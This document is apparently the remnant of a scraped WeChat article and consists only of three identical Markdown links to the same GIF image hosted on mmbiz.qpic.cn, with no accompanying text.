![](https://mmbiz.qpic.cn/mmbiz_gif/0VlSQrG5VxaFSrqyULYn7RsCv3gdVCDeTDAKgRQSqoKjPWuicu16jU803JO0NMdHqUfpbTWJwVXAibCymA6ROYlA/640?wxfrom=5&wx_fmt=gif&wx_lazy=1)

![](https://mmbiz.qpic.cn/mmbiz_gif/0VlSQrG5VxaFSrqyULYn7RsCv3gdVCDeTDAKgRQSqoKjPWuicu16jU803JO0NMdHqUfpbTWJwVXAibCymA6ROYlA/640?wxfrom=5&wx_fmt=gif&wx_lazy=1)

![](https://mmbiz.qpic.cn/mmbiz_gif/0VlSQrG5VxaFSrqyULYn7RsCv3gdVCDeTDAKgRQSqoKjPWuicu16jU803JO0NMdHqUfpbTWJwVXAibCymA6ROYlA/640?wxfrom=5&wx_fmt=gif&wx_lazy=1)